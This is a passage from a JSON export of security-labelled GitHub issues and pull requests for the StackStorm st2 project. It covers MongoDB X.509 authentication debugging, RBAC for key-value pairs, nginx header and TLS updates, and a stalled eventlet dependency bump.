**opts)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 2059, in create_index\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return self.__create_indexes([index], session, **cmd_options)[0]\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 1949, in __create_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    self._command(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 238, in _command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return sock_info.command(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/pool.py\", line 683, in command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return command(self, dbname, spec, slave_ok,\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/network.py\", line 159, in command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    helpers._check_command_response(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/helpers.py\", line 164, in _check_command_response\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise OperationFailure(errmsg, code, response, max_wire_version)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: pymongo.errors.OperationFailure: command createIndexes requires authentication, full error: {'ok': 0.0, 'errmsg': 'command createIndexes requires authentication', 'code': 13, 'codeName': 'Unauthorized'}\r\n```\r\n\r\nManual code (not working):\r\n```\r\nIn [1]: import ssl as ssl_lib\r\n   ...: \r\n   ...: import mongoengine\r\n   ...: import pymongo\r\n   ...: \r\n   ...: \r\n   ...: def _get_ssl_kwargs(\r\n   ...:     ssl=False,\r\n   ...:     ssl_keyfile=None,\r\n   ...:     ssl_certfile=None,\r\n   ...:     ssl_cert_reqs=None,\r\n   ...:     ssl_ca_certs=None,\r\n   ...:     authentication_mechanism=None,\r\n   ...:     ssl_match_hostname=True,\r\n   ...:     authentication_source=None,\r\n   ...: ):\r\n   ...:     # NOTE: In pymongo 3.9.0 some of the ssl related arguments have been renamed -\r\n   ...:     # https://api.mongodb.com/python/current/changelog.html#changes-in-version-3-9-0\r\n   ...:     # Old names still work, but we should eventually update to new argument names.\r\n   ...:     ssl_kwargs = {\r\n   ...:         \"ssl\": ssl,\r\n   ...:     }\r\n   ...:     if ssl_keyfile:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_keyfile\"] = ssl_keyfile\r\n   ...:     if ssl_certfile:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_certfile\"] = ssl_certfile\r\n   ...:     if ssl_cert_reqs:\r\n   ...:         if ssl_cert_reqs == \"none\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_NONE\r\n   ...:         elif ssl_cert_reqs == \"optional\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_OPTIONAL\r\n   ...:         elif ssl_cert_reqs == \"required\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_REQUIRED\r\n   ...:         ssl_kwargs[\"ssl_cert_reqs\"] = ssl_cert_reqs\r\n   ...:     if ssl_ca_certs:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_ca_certs\"] = ssl_ca_certs\r\n   ...:     if authentication_mechanism:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"authentication_mechanism\"] = authentication_mechanism\r\n   ...:     if ssl_kwargs.get(\"ssl\", False):\r\n   ...:         # pass in ssl_match_hostname only if ssl is True. The right default value\r\n   ...:         # for ssl_match_hostname in almost all cases is True.\r\n   ...:         ssl_kwargs[\"ssl_match_hostname\"] = ssl_match_hostname\r\n   ...:     if authentication_source:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"authentication_source\"] = authentication_source\r\n   ...:     return ssl_kwargs\r\n   ...: \r\n   ...: \r\n   ...: ssl_kwargs = _get_ssl_kwargs(\r\n   ...:     ssl=True,\r\n   ...:     ssl_keyfile='/etc/st2/mongo_certs/client.key',\r\n   ...:     ssl_certfile='/etc/st2/mongo_certs/client-signed.crt',\r\n   ...:     ssl_cert_reqs='required',\r\n   ...:     ssl_ca_certs='/etc/st2/mongo_certs/ca.pem',\r\n   ...:     ssl_match_hostname=False,\r\n   ...: )\r\n   ...: \r\n   ...: connection = mongoengine.connection.connect(\r\n   ...:     'st2',\r\n   ...:     host='127.0.0.1',\r\n   ...:     port=27017,\r\n   ...:     tz_aware=True,\r\n   ...:     username=None,\r\n   ...:     password=None,\r\n   ...:     connectTimeoutMS=3000,\r\n   ...:     serverSelectionTimeoutMS=3000,\r\n   ...:     **ssl_kwargs\r\n   ...: )\r\n\r\nIn [2]: connection.admin.command(\"ping\")\r\nOut[2]: {'ok': 1.0}\r\n\r\nIn [3]: connection.st2.list_collections()\r\n---------------------------------------------------------------------------\r\nOperationFailure                          Traceback (most recent call last)\r\nCell In [3], line 1\r\n----> 1 connection.st2.list_collections()\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:825, in Database.list_collections(self, session, filter, **kwargs)\r\n    820 def _cmd(session, server, sock_info, slave_okay):\r\n    821     return self._list_collections(\r\n    822         sock_info, slave_okay, session, read_preference=read_pref,\r\n    823         **kwargs)\r\n--> 825 return self.__client._retryable_read(\r\n    826     _cmd, read_pref, session)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/mongo_client.py:1471, in MongoClient._retryable_read(self, func, read_pref, session, address, retryable, exhaust)\r\n   1467         if retrying and not retryable:\r\n   1468             # A retry is not possible because this server does\r\n   1469             # not support retryable reads, raise the last error.\r\n   1470             raise last_error\r\n-> 1471         return func(session, server, sock_info, slave_ok)\r\n   1472 except ServerSelectionTimeoutError:\r\n   1473     if retrying:\r\n   1474         # The application may think the write was never attempted\r\n   1475         # if we raise ServerSelectionTimeoutError on the retry\r\n   1476         # attempt. Raise the original exception instead.\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:821, in Database.list_collections.<locals>._cmd(session, server, sock_info, slave_okay)\r\n    820 def _cmd(session, server, sock_info, slave_okay):\r\n--> 821     return self._list_collections(\r\n    822         sock_info, slave_okay, session, read_preference=read_pref,\r\n    823         **kwargs)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:770, in Database._list_collections(self, sock_info, slave_okay, session, read_preference, **kwargs)\r\n    767     cmd.update(kwargs)\r\n    768     with self.__client._tmp_session(\r\n    769             session, close=False) as tmp_session:\r\n--> 770         cursor = self._command(\r\n    771             sock_info, cmd, slave_okay,\r\n    772             read_preference=read_preference,\r\n    773             session=tmp_session)[\"cursor\"]\r\n    774         return CommandCursor(\r\n    775             coll,\r\n    776             cursor,\r\n    777             sock_info.address,\r\n    778             session=tmp_session,\r\n    779             explicit_session=session is not None)\r\n    780 else:\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:626, in Database._command(self, sock_info, command, slave_ok, value, check, allowable_errors, read_preference, codec_options, write_concern, parse_write_concern_error, session, **kwargs)\r\n    624 command.update(kwargs)\r\n    625 with self.__client._tmp_session(session) as s:\r\n--> 626     return sock_info.command(\r\n    627         self.__name,\r\n    628         command,\r\n    629         slave_ok,\r\n    630         read_preference,\r\n    631         codec_options,\r\n    632         check,\r\n    633         allowable_errors,\r\n    634         write_concern=write_concern,\r\n    635         parse_write_concern_error=parse_write_concern_error,\r\n    636         session=s,\r\n    637         client=self.__client)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/pool.py:683, in SocketInfo.command(self, dbname, spec, slave_ok, read_preference, codec_options, check, allowable_errors, check_keys, read_concern, write_concern, parse_write_concern_error, collation, session, client, retryable_write, publish_events, user_fields, exhaust_allowed)\r\n    681     self._raise_if_not_writable(unacknowledged)\r\n    682 try:\r\n--> 683     return command(self, dbname, spec, slave_ok,\r\n    684                    self.is_mongos, read_preference, codec_options,\r\n    685                    session, client, check, allowable_errors,\r\n    686                    self.address, check_keys, listeners,\r\n    687                    self.max_bson_size, read_concern,\r\n    688                    parse_write_concern_error=parse_write_concern_error,\r\n    689                    collation=collation,\r\n    690                    compression_ctx=self.compression_context,\r\n    691                    use_op_msg=self.op_msg_enabled,\r\n    692                    unacknowledged=unacknowledged,\r\n    693                    user_fields=user_fields,\r\n    694                    exhaust_allowed=exhaust_allowed)\r\n    695 except OperationFailure:\r\n    696     raise\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/network.py:159, in command(sock_info, dbname, spec, slave_ok, is_mongos, read_preference, codec_options, session, client, check, allowable_errors, address, check_keys, listeners, max_bson_size, read_concern, parse_write_concern_error, collation, compression_ctx, use_op_msg, unacknowledged, user_fields, exhaust_allowed)\r\n    157             client._process_response(response_doc, session)\r\n    158         if check:\r\n--> 159             helpers._check_command_response(\r\n    160                 response_doc, sock_info.max_wire_version, allowable_errors,\r\n    161                 parse_write_concern_error=parse_write_concern_error)\r\n    162 except Exception as exc:\r\n    163     if publish:\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/helpers.py:164, in _check_command_response(response, max_wire_version, allowable_errors, parse_write_concern_error)\r\n    161 elif code == 43:\r\n    162     raise CursorNotFound(errmsg, code, response, max_wire_version)\r\n--> 164 raise OperationFailure(errmsg, code, response, max_wire_version)\r\n\r\nOperationFailure: command listCollections requires authentication, full error: {'ok': 0.0, 'errmsg': 'command listCollections requires authentication', 'code': 13, 'codeName': 'Unauthorized'}\r\n```\r\n\r\nManual code (working):\r\n```\r\nIn [1]: import ssl as ssl_lib\r\n   ...: \r\n   ...: import mongoengine\r\n   ...: import pymongo\r\n   ...: \r\n   ...: ssl_kwargs = {\r\n   ...:     'ssl': True,\r\n   ...:     'tlsCertificateKeyFile': '/etc/st2/mongo_certs/client.pem',\r\n   ...:     'tlsCAFile': '/etc/st2/mongo_certs/ca.pem',\r\n   ...:     'tlsAllowInvalidHostnames': True,\r\n   ...:     'tlsAllowInvalidCertificates': True,\r\n   ...:     'authSource': '$external',\r\n   ...:     'authMechanism': 'MONGODB-X509'\r\n   ...: }\r\n   ...: connection = mongoengine.connection.connect(\r\n   ...:     'st2',\r\n   ...:     host='127.0.0.1',\r\n   ...:     port=27017,\r\n   ...:     tz_aware=True,\r\n   ...:     username=None,\r\n   ...:     password=None,\r\n   ...:     connectTimeoutMS=3000,\r\n   ...:     serverSelectionTimeoutMS=3000,\r\n   ...:     **ssl_kwargs\r\n   ...: )\r\n\r\nIn [2]: connection.admin.command(\"ping\")\r\nOut[2]: {'ok': 1.0}\r\n\r\nIn [3]: test = connection.st2.list_collections()\r\n\r\nIn [4]: list(test)\r\nOut[4]: \r\n[{'name': 'task_execution_d_b',\r\n  'type': 'collection',\r\n  'options': {},\r\n  'info': {'readOnly': False,\r\n   'uuid': UUID('bcd6d2b5-6226-47ef-ac6e-217e30fcca4e')},\r\n  'idIndex': {'v': 2,\r\n   'key': {'_id': 1},\r\n   'name': '_id_',\r\n   'ns': 'st2.task_execution_d_b'}},\r\n   ......\r\n```",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5354",
                "title": "Implementation of RBAC for KeyValuePair",
                "labels": [
                    "feature",
                    "security",
                    "RBAC",
                    "size/XL"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5354,
                "id": 992309652,
                "state": "closed",
                "project_created_at": "2021-09-09T14:40:30Z",
                "closed_at": "2021-12-10T17:16:16Z",
                "body": "Implemented RBAC functionality and unit tests for key-value pairs for existing and new permission types. Previously, RBAC feature for key value pairs are not yet implemented.\r\n- Existing permission types - KEY_VALUE_VIEW, KEY_VALUE_SET, KEY_VALUE_DELETE\r\n- New permission types - KEY_VALUE_LIST, KEY_VALUE_ALL\r\n\r\nRBAC is enabled in the st2.conf file. Access to a key value pair is checked in the KeyValuePair API controller.\r\n- SET and DELETE permissions will automatically grant LIST and VIEW permissions.\r\n- By default, user has access to his/her own user scoped KVPs without requiring specific permission grant.\r\n- A non-admin user can be explicitly granted permission to one or more system scoped KVPs.\r\n- A non-admin user cannot access another user's KVPs.\r\n- By default, admin and system_admin has ALL access to system scoped KVPs.\r\n- Admin has full access to another user's KVPs (behavior in current version).\r\n\r\nThis change requires RBAC backend support @ PR https://github.com/StackStorm/st2-rbac-backend/pull/55.",
                "comments": [
                    {
                        "body": "Moving this feature to v3.7.0 to give more time for folks to soak this in.",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-10-03T23:07:22Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-933040720"
                    },
                    {
                        "body": "@ashwini-orchestral The PR needs a Changelog. Please add one.\r\n\r\n@m4dcoder Additionally, do we need documentation changes for this new feature as well?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-12-09T18:33:48Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-990116145"
                    },
                    {
                        "body": "@armab Corresponding PR for docs at https://github.com/StackStorm/st2docs/pull/1092",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-12-10T17:23:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-991154620"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5354",
                    "merged_at": "2021-12-10T17:16:16Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5298",
                "title": "Changed X-XSS-Protection to follow OWASP standards due to deprecation.",
                "labels": [
                    "security",
                    "size/XS",
                    "nginx"
                ],
                "user": "LiamRiddell",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5298,
                "id": 936252160,
                "state": "closed",
                "project_created_at": "2021-07-03T13:09:03Z",
                "closed_at": "2022-07-19T19:24:44Z",
                "body": "Modified the `conf/nginx/st2.conf` to disable the `X-XSS-Protection` functionality in order to align with the OWASP standards. As most browser vendors have deprecated or removed this feature due to the fact it can introduce additional security issues.  Please view the following sources:\r\n\r\nOWASP:\r\n![image](https://user-images.githubusercontent.com/3812154/124355183-d157b500-dc07-11eb-8ac2-2c513ff1ced1.png)\r\n\r\nMozilla Developer Network Web Docs:\r\n![image](https://user-images.githubusercontent.com/3812154/124355214-f0564700-dc07-11eb-9113-63c064781597.png)\r\n\r\nReferences:\r\nOWASP - https://owasp.org/www-project-secure-headers/#x-xss-protection\r\nMDN - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection\r\n",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5298) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-07-03T13:09:08Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873405933"
                    },
                    {
                        "body": "Seems reasonable to me although it would also be good to check the \"legacy browsers\" list and ensure it's indeed very old version with very little or no usage in real world.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-07-04T09:38:59Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873555068"
                    },
                    {
                        "body": "Agreed, I believe we could potentially use `Can I Use?` maintained service to get an idea of browser list. \r\nhttps://caniuse.com/mdn-http_headers_x-xss-protection",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-07-04T21:02:46Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873661871"
                    },
                    {
                        "body": "Do we need to replace X-XSS-Protection with CSP? https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-05T21:49:05Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-934895722"
                    },
                    {
                        "body": "@LiamRiddell Would you please add a changelog entry and replace `X-XSS-Protection` with `Content-Security-Policy`?",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:32:57Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1086256967"
                    },
                    {
                        "body": "@cognifloyd Hi Jacob, apologies. You want me to add a new changelog entry in the \"CHANGELOG.rst\" file in the root directory of the project? Best, Liam.",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:16:11Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189281806"
                    },
                    {
                        "body": "Correct",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T16:21:20Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189294633"
                    },
                    {
                        "body": "> Correct\r\n\r\nDo you want me to add it under the \"in development\" change log?\r\n",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:22:03Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189296472"
                    },
                    {
                        "body": "Yes. Then when we cut a release, that section gets renamed to the version number and we add a new in development section.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T16:23:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189300244"
                    },
                    {
                        "body": "> Yes. Then when we cut a release, that section gets renamed to the version number and we add a new in development section.\r\n\r\nPerfect, please review the changes. Sorry again for the delay!",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:28:13Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189305113"
                    },
                    {
                        "body": "> Do we need to replace X-XSS-Protection with CSP? https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\r\n\r\nYes, if possible that is standard practice to mitigate against XSS. However, in some apps it may not be a simple change as the blast radius of blocking resources based on allow-list could cause issues across the app.",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:35:18Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189312316"
                    },
                    {
                        "body": "I'm not sure why CircleCI isn't running this PR. I'm going to close and reopen to trigger it (hopefully)",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T19:13:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189458350"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5298",
                    "merged_at": "2022-07-19T19:24:44Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5280",
                "title": "Update nginx config to support TLS v1.3 in addition to TLS v1.2",
                "labels": [
                    "security",
                    "size/S",
                    "nginx"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5280,
                "id": 910353449,
                "state": "closed",
                "project_created_at": "2021-06-03T10:28:23Z",
                "closed_at": "2021-06-11T19:53:28Z",
                "body": "This pull request updates production + sample nginx configs to also support TLS v1.3 in addition to TLS v1.2.\r\n\r\nKeep in mind that TLS v1.3 will only be used if the server and client support it. On the server side, this means it will work out of the box on more recent distros where nginx version is >= v1.13 and nginx is compiled against OpenSSL v 1.1.1 which supports TLS v1.3.\r\n\r\nResolves #5216.",
                "comments": [
                    {
                        "body": "Thinking that this user-affecting change probably worth a small note in the upcoming Release Announcement",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-03T11:02:34Z",
                        "url": "https://github.com/StackStorm/st2/pull/5280#issuecomment-853784090"
                    },
                    {
                        "body": "Do we also need a small remark in the https://docs.stackstorm.com/upgrade_notes.html ?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-03T11:03:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5280#issuecomment-853784618"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5280",
                    "merged_at": "2021-06-11T19:53:28Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5257",
                "title": "Bump eventlet from 0.30.2 to 0.31.0",
                "labels": [
                    "bug",
                    "security",
                    "external dependency",
                    "size/M"
                ],
                "user": "dependabot[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5257,
                "id": 881037195,
                "state": "closed",
                "project_created_at": "2021-05-08T16:43:29Z",
                "closed_at": "2023-11-27T12:29:32Z",
                "body": "Bumps [eventlet](https://github.com/eventlet/eventlet) from 0.30.2 to 0.31.0.\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/eventlet/eventlet/blob/master/NEWS\">eventlet's changelog</a>.</em></p>\n<blockquote>\n<h1>0.31.0</h1>\n<ul>\n<li>IMPORTANT: websocket: Limit maximum uncompressed frame length to 8MiB <a href=\"https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2\">https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2</a></li>\n</ul>\n<h1>0.30.3</h1>\n<ul>\n<li>wsgi: websocket ALREADY_HANDLED flag on corolocal</li>\n<li>green.ssl: Set suppress_ragged_eofs default based on SSLSocket defaults</li>\n<li>greenio: socket.connect_ex returned None instead of 0 on success</li>\n<li>Use _imp instead of deprecated imp</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/f717f382d0bfb5cf084a9e69737fa6dfcb2eb5cf\"><code>f717f38</code></a> v0.31.0 release</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/1412f5e4125b4313f815778a1acb4d3336efcd07\"><code>1412f5e</code></a> websocket: Limit maximum uncompressed frame length to 8MiB</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/b0be94ef38a621ba5cb8ae3421d7367fc13ddae2\"><code>b0be94e</code></a> v0.30.3 release</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/df0bc00c3b758b0a632929a7ade2125d0a80c08a\"><code>df0bc00</code></a> wsgi: websocket ALREADY_HANDLED flag on corolocal</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/377b4fb39cc59273bd5ff461eb0388e3c3dffdb3\"><code>377b4fb</code></a> green.ssl: Set suppress_ragged_eofs default based on SSLSocket defaults</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/71b76bfc5166050dc333c72ead6b51a8933061e7\"><code>71b76bf</code></a> Security Policy</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/50441fc1563b85a275ea9937208909ade9907eb3\"><code>50441fc</code></a> greenio: socket.connect_ex returned None instead of 0 on success</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/e16fcab6019f97db2639ce970dc0cf9546114921\"><code>e16fcab</code></a> Use _imp instead of deprecated imp</li>\n<li>See full diff in <a href=\"https://github.com/eventlet/eventlet/compare/v0.30.2...v0.31.0\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=eventlet&package-manager=pip&previous-version=0.30.2&new-version=0.31.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)\n\nYou can trigger a rebase of this PR by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n\nYou can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/StackStorm/st2/network/alerts).\n\n</details>\n\n> **Note**\n> Automatic rebases have been disabled on this pull request as it has been open for over 30 days.\n",
                "comments": [
                    {
                        "body": "Based on history, we tried to update the `eventlet` before here: https://github.com/StackStorm/st2/pull/5255#issuecomment-835861160 by @Kami \r\n\r\nHowever, because of the breaking change, it fails the build in `guinicorn` which relies on specific `eventlet` functionality.\r\n\r\n* https://github.com/eventlet/eventlet/issues/702\r\n* https://github.com/benoitc/gunicorn/pull/2581\r\n* https://stackoverflow.com/a/67429430/4533625\r\n\r\nPer https://github.com/eventlet/eventlet/issues/702#issuecomment-833432067, the proper fix in `gunicorn` was merged, but the new version wasn't released yet.\r\n\r\nSo the current status is that we're waiting for the `guinicorn` version to be released here: https://github.com/benoitc/gunicorn/releases (newer than 20.1.0) and so we can update both `eventlent` + `gunicorn` in this PR to merge it.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-08-11T18:39:57Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-897061081"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5257) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-08-29T11:09:25Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-907773484"
                    },
                    {
                        "body": "Update on gunicorn 7 days ago, saying new release would be out this week: https://github.com/benoitc/gunicorn/issues/2638",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-09-07T16:39:16Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-914458638"
                    },
                    {
                        "body": "Looks like https://github.com/benoitc/gunicorn/issues/2638 is still unreleased.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-01T13:45:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932242486"
                    },
                    {
                        "body": "@armab Shall we move this to 3.7.0?",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-10-01T15:11:29Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932316064"
                    },
                    {
                        "body": "Yeah. 1 week has become 1 month, and they have only merged 1 PR in that time. That PR has nothing to do with the release (afaict), so who knows when it will happen. I moved this to 3.7.0",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-02T07:04:33Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932697636"
                    },
                    {
                        "body": "No new release - latest is still 20.1.0 - but project still active. 6 open issues in the next release plan - https://github.com/benoitc/gunicorn/milestone/20.",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-03-04T09:54:20Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1059010736"
                    },
                    {
                        "body": "Thanks for checking!\r\nWe have no choice, but to move the issue to the next v3.8.0 and keep track of it.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-05T12:09:41Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1059752019"
                    },
                    {
                        "body": "More than 1 year later and still no gunicorn 21 release.  Eventlet is now at 0.33.0 which makes this PR obsolete.",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-14T06:18:10Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1246293608"
                    },
                    {
                        "body": "What are peoples opinion on the idea of forking gunicorn and building v3.8 from our forked repo that includes that patch we need to move past eventlet 0.30.2?",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-14T21:14:56Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247309888"
                    },
                    {
